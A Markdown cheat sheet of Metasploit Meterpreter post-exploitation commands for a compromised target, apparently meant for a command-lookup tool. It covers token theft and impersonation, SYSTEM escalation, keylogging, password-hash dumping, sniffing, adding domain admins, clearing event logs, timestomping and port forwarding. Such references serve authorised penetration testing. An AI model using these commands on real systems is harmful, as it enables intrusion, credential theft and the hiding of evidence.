# Meterpreter commands

% linux, metasploit

Here is the reformatted text:

## Open Meterpreter usage help.
```
help
```

## Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.
```
run <scriptname>
```

## Show the system information on the compromised target.
```
sysinfo
```

## List the files and folders on the target.
```
ls
```

## Load the privilege extension for extended Meterpreter libraries.
```
use priv
```

## Show all running processes and which accounts are associated with each process.
```
ps
```

## Migrate to the specific process ID (PID is the target process ID gained from the ps command).
```
migrate <proc. id>
```

## Load incognito functions. (Used for token stealing and impersonation on a target machine.)
```
use incognito
```

## List available tokens on the target by user.
```
list_tokens -u
```

## List available tokens on the target by group.
```
list_tokens -g
```

## Impersonate a token available on the target.
```
impersonate_token <DOMAIN_NAMEUSERNAME>
```

## Steal the tokens available for a given process and impersonate that token.
```
steal_token <proc. id>
```

## Stop impersonating the current token.
```
drop_token
```

## Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.
```
getsystem
```

## Drop into an interactive shell with all available tokens.
```
shell
```

## Execute cmd.exe and interact with it.
```
execute -f <cmd.exe> -i
```

## Execute cmd.exe with all available tokens.
```
execute -f <cmd.exe> -i -t
```

## Execute cmd.exe with all available tokens and make it a hidden process.
```
execute -f <cmd.exe> -i -H -t
```

## Revert back to the original user you used to compromise the target.
```
rev2self
```

## Interact, create, delete, query, set, and much more in the target’s registry.
```
reg <command>
```

## Switch to a different screen based on who is logged in.
```
setdesktop <number>
```

## Take a screenshot of the target’s screen.
```
screenshot
```

## Upload a file to the target.
```
upload <filename>
```

## Download a file from the target.
```
download <filename>
```

## Start sniffing keystrokes on the remote target.
```
keyscan_start
```

## Dump the remote keys captured on the target.
```
keyscan_dump
```

## Stop sniffing keystrokes on the remote target.
```
keyscan_stop
```

## Get as many privileges as possible on the target.
```
getprivs
```

## Take control of the keyboard and/or mouse.
```
uictl enable <keyboard/mouse>
```

## Run your current Meterpreter shell in the background.
```
background
```

## Dump all hashes on the target. use sniffer Load the sniffer module.
```
hashdump
```

## List the available interfaces on the target.
```
sniffer_interfaces
```

## Start sniffing on the remote target.
```
sniffer_dump <interfaceID> pcapname
```

## Start sniffing with a specific range for a packet buffer.
```
sniffer_start <interfaceID> packet-buffer
```

## Grab statistical information from the interface you are sniffing.
```
sniffer_stats <interfaceID>
```

## Stop the sniffer.
```
sniffer_stop <interfaceID>
```

## Add a user on the remote target.
```
add_user <username> <password> -h <ip>
```

## Add a username to the Domain Administrators group on the remote target.
```
add_group_user <"Domain Admins"> <username> -h <ip>
```

## Clear the event log on the target machine.
```
clearev
```

## Change file attributes, such as creation date (antiforensics measure).
```
timestomp
```

## Reboot the target machine.
```
reboot
```

## meterpreter - Display portfwd features
```
meterpreter > help portfwd
```

## meterpreter - Add port forwarding rule
```
meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>
```

## meterpreter - Add reverse port forwarding
```
meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>
```

## meterpreter - Background session
```
meterpreter > bg
```
